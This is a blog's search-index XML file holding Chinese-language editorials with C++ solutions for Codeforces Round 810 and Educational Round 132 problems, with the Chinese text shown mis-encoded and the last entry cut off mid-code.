<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Codeforces Round 810(Div.2)è§£æ</title>
      <link href="/2022/07/25/Codeforces%20Round%20810(Div.2)/"/>
      <url>/2022/07/25/Codeforces%20Round%20810(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>è¿™åœºæ‰“å›æ¥ä¸€ç‚¹å§ï¼Œåªæ˜¯çœ‹éš”å£div1å¥½åƒè¢«å–·çƒ‚äº†çš„æ ·å­ï¼Œå’±ä¹Ÿä¸æ‡‚ï¼Œä¹Ÿæ²¡èµ„æ ¼æ‰“div1ï¼Œå¾ˆå¤šç»†èŠ‚æ²¡æ³¨æ„åˆ°é€å‡ºå»ç½šæ—¶å°±å¾ˆéš¾å—ï¼Œæœ¬åœºå½•å±åœ¨Bç«™äº†ï¼Œ</p><span id="more"></span><h2 id="A-Perfect-Permutation"><a href="#A-Perfect-Permutation" class="headerlink" title="A. Perfect Permutation"></a>A. Perfect Permutation</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜é¢˜æ„çœ‹äº†æˆ‘æœ‰ç‚¹ä¹…ï¼Œå°±æ˜¯æ„é€ ä¸€ä¸²èƒ½ä½¿å¾— <code>a[i]/i</code> ä¸ºæ•´æ•°æ¯”è¾ƒå°‘çš„åºåˆ—ï¼Œé‚£ä¹ˆ <code>i=1</code> å®ƒå¯ä»¥è¢«ä»»æ„æ•°æ•´é™¤ã€‚ä½†æ˜¯ <code>i&gt;1</code> æˆ‘æ€»èƒ½æ‰¾åˆ°ä¸èƒ½æ•´é™¤çš„æ•°ï¼Œå› æ­¤è¿™é‡Œæ„é€ çš„åºåˆ—å°±æ˜¯ï¼Œç¬¬ä¸€ä¸ªç»™ <code>n</code>ï¼Œåé¢çš„ç»™ <code>i-1</code> å³å¯ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">&#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Party"><a href="#B-Party" class="headerlink" title="B. Party"></a>B. Party</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ï¼Œå‡ºçš„ä¹ŸæŒºå¥½çš„æ„Ÿè§‰ï¼Œè™½ç„¶ä¸€å¼€å§‹å¯èƒ½é¢˜æ„æœ‰ç‚¹æ²¡è¯»æ‡‚ã€‚æœ‰nä¸ªäººï¼Œmå¯¹å…³ç³»ï¼Œå¦‚æœæ¯ä¸ªäººå¦‚æœæ²¡æ¥å°±ä¼šäº§ç”Ÿ $a_i$ çš„ä¸å¼€å¿ƒåº¦ï¼Œå¦‚æœæ¥äº†ä¸€å¯¹æœ‹å‹é‚£è¿™å¯¹æœ‹å‹è¦æ¶ˆè€—ä¸€ä¸ªè›‹ç³•ï¼Œä¸€æ¬¡åªèƒ½ç”Ÿäº§å¶æ•°ä¸ªè›‹ç³•ä¸èƒ½æµªè´¹ã€‚é‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼Œå¦‚æœå…³ç³»æœ¬èº«å°±æ˜¯å¶æ•°å¯¹ï¼Œé‚£ä¹ˆæ‰€æœ‰äººéƒ½å¯ä»¥æ¥ã€‚å¦‚æœå…³ç³»æ˜¯å¥‡æ•°å¯¹ï¼Œæˆ‘å°±å¾—è€ƒè™‘è¸¢äººäº†ï¼Œè¸¢æ‰ä¸€ä¸ªäººçš„æƒ…å†µï¼Œä½¿å¥‡æ•°å¯¹å˜æˆå¶æ•°å¯¹çš„æ–¹å¼å°±æ˜¯ï¼Œè¿™ä¸ªäººæœ‰å¥‡æ•°å¯¹å…³ç³»ï¼Œé‚£ä¹ˆè¸¢äº†è¿™ä¸ªäººå°±å°‘äº†å¥‡æ•°å¯¹å…³ç³»ï¼Œç»“æœå˜æˆå¶æ•°å¯¹äº†ã€‚è¸¢æ‰ä¸¤ä¸ªäººçš„æƒ…å†µï¼Œå¦‚æœæ‰€æœ‰äººçš„å…³ç³»æ•°éƒ½æ˜¯å¥‡æ•°å¯¹æˆ–è€…æœ¬èº«è¸¢æ‰ä¸¤ä¸ªäººæ¯”è¸¢æ‰ä¸€ä¸ªäººäº§ç”Ÿä¸å¼€å¿ƒæŒ‡æ•°æ›´å¤šï¼Œæˆ‘å°±è¦è€ƒè™‘åé¢çš„æƒ…å†µäº†ã€‚é‚£ä¹ˆæˆ‘å¦‚æœè¦è¸¢æ‰ä¸¤ä¸ªäººï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäººä¸€å®šéƒ½æœ‰å¶æ•°å¯¹å…³ç³»ï¼Œå› ä¸ºä½†å‡¡æœ‰ä¸€ä¸ªå¥‡æ•°å¯¹å…³ç³»æˆ‘éƒ½å¯ä»¥åªè¸¢æ‰é‚£ä¸ªäººè€Œä¿ç•™ä¸‹æ¥å¦ä¸€ä¸ªï¼Œæ˜¾ç„¶è¿™æ ·çš„ä½œæ³•æ¯”è¾ƒä¼˜ã€‚é‚£ä¹ˆè¸¢æ‰çš„ä¸¤ä¸ªäººéƒ½æ˜¯å¶æ•°å¯¹å…³ç³»æ€ä¹ˆåŠå‘¢ï¼Ÿå¦‚æœå®ƒä»¬è‡ªå·±äº§ç”Ÿäº†ä¸€å¯¹å…³ç³»ï¼Œé‚£ä¹ˆä¸¤ä¸ªäººçš„å¶æ•°å…³ç³»å‘ç”Ÿä¸€ä¸ªå…³ç³»çš„é‡åˆï¼Œæ€»ä½“ä¸‹æ¥å°±æ˜¯å¥‡æ•°å¯¹å…³ç³»äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è¸¢æ‰ä¸¤ä¸ªæœ‹å‹å…³ç³»çš„ï¼Œå¼€å¿ƒæŒ‡æ•°è¾ƒå°çš„ä¸¤ä¸ªäººã€‚</p><p>ç„¶åminä¸€ä¸‹å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> v;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;G[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.v&lt;b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].v);</span><br><span class="line">a[i].i=i;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(G[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line"><span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">table[a[i].i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">G[table[x]].<span class="built_in">push_back</span>(table[y]);</span><br><span class="line">G[table[y]].<span class="built_in">push_back</span>(table[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">m=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="comment">//printf(&quot;i=%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d has %d\n&quot;,a[i].i,G[i].size());</span></span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>)&#123;</span><br><span class="line">m=a[i].v;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v&gt;m)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x=G[i].<span class="built_in">begin</span>();x!=G[i].<span class="built_in">end</span>();x++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i].v+a[*x].v&lt;m)&#123;</span><br><span class="line"><span class="keyword">if</span>(G[i].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;G[*x].<span class="built_in">size</span>()%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">m=a[i].v+a[*x].v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Color-the-Picture"><a href="#C-Color-the-Picture" class="headerlink" title="C. Color the Picture"></a>C. Color the Picture</h2><h2 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2022/07/25/Codeforces%20Round%20810(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜ä¹Ÿè¿˜æŒºå¥½çš„ï¼Œå°±æ˜¯åˆ·æ ¼å­ï¼Œç„¶åè¦æ±‚ä¸€æ¯ä¸ªæ ¼å­å“é“ƒæ ¼å­éƒ½è‡³å°‘æœ‰ä¸‰å—ç›¸åŒè‰²å—ï¼Œé‚£ä¹ˆå°±æ˜¯è¯´ä½ æœ€å¤šåªæœ‰ä¸€ä¸ªä¸åŒè‰²å—çš„ç›¸é‚»ï¼Œå¹¶ä¸”å‘Šè¯‰ä½ äº†æ€ä¹ˆå¤„ç†è¾¹ç•Œçš„è‰²å—ã€‚é‚£ä¹ˆå®ƒä¸‹é¢å±•ç¤ºçš„å›¾å…¶å®è¿˜æ˜¯æ¯”è¾ƒç”ŸåŠ¨çš„ï¼Œå°±æ˜¯åˆ·ä¸¤åˆ—æˆ–è€…ä¸¤è¡Œï¼Œç„¶åå†åˆ·ä¸¤åˆ—ä¸¤åˆ—ï¼Œå¦‚æ­¤å¾€å¤ã€‚å½“ç„¶ï¼Œä¸‰åˆ—å››åˆ—éƒ½å¯ä»¥ï¼Œä¸€åˆ—æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå·¦å³å°±æœ‰ä¸¤ä¸ªä¸åŒé¢œè‰²çš„è‰²å—äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ¯è¡Œæ¯åˆ—çœ‹çœ‹èƒ½ä¸èƒ½æ”¾çš„å‡ºå¯¹åº”çš„è¡Œæˆ–è€…åˆ—æ•°å³å¯ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦ç‰¹åˆ¤ï¼Œå¦‚æœæˆ‘ä»¬éƒ½åªèƒ½æ”¾ä¸¤åˆ—ï¼Œä½†æ˜¯å´åªæœ‰å¥‡æ•°åˆ—ï¼Œè¿™ç§æƒ…å†µæ˜¯ä¸è¡Œçš„ï¼ï¼</p><p>æœ€åä¸å¼€ <code>long long</code> è§ç¥–å®—ï¼Œä¸‡äº‹ç»™æˆ‘åŠ ä¸Šä¸€å¥<code>#define int long long</code>ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],c[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="comment">//int cmp(int a,int b)&#123;</span></span><br><span class="line"><span class="comment">//return a&lt;b;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">b[i]=a[i]/n;</span><br><span class="line">c[i]=a[i]/m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i]!=<span class="number">2</span>)flag1=<span class="number">1</span>;</span><br><span class="line">ans+=b[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=m)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag1&amp;&amp;m%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(c[i]!=<span class="number">2</span>)flag2=<span class="number">1</span>;</span><br><span class="line">ans+=c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,ans,n);</span></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=n)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag2&amp;&amp;n%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åè¯´ä¸€å¥å§ï¼Œå°±æ˜¯ç»†èŠ‚é—®é¢˜çœŸçš„è¦è€ƒè™‘å‘¨å…¨ä¸€ç‚¹çš„ï¼Œå°ä¸Šä¸€æ³¢åˆ†ï¼Œä½†æ˜¯ç¦»1600è¿˜æ˜¯å·®è¿œäº†ï¼Œåªèƒ½ç»§ç»­åŠªåŠ›äº†ï¼ŒæœŸå¾…ä¸‹æ¬¡ä¸Šå¤§åˆ†äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Codeforces Round 132(Div.2)åˆ†æ</title>
      <link href="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/"/>
      <url>/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡çš„æ¯”èµ›æ²¡æ‰“ï¼Œä½†æ˜¯è‡ªå·±æ‰“ä¼°è®¡å°±æ˜¯è‡ªé—­ä¸Šå»çš„ã€‚</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸‰ä¸ªé—¨ï¼Œæ¯ä¸ªé—¨åå¯èƒ½æœ‰ğŸ”‘ï¼Œä¸€ä¸ªé’¥åŒ™å¼€ä¸€ä¸ªå¯¹åº”çš„é—¨ï¼Œé—®ä½ æ˜¯å¦æœ‰åŠæ³•æŠŠæ‰€æœ‰çš„é—¨æ‰“å¼€ã€‚å¾ˆç®€å•ï¼Œå°±é‚£åˆ°ğŸ”‘å¼€ä¸ªé—¨ï¼Œæ¢æ–°é’¥åŒ™ï¼Œçœ‹çœ‹èƒ½å¼€å‡ ä¸ªé—¨å°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;a,&amp;b[<span class="number">1</span>],&amp;b[<span class="number">2</span>],&amp;b[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> key=a,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(key)&#123;</span><br><span class="line">        key=b[key];</span><br><span class="line">        cnt++;</span><br><span class="line">    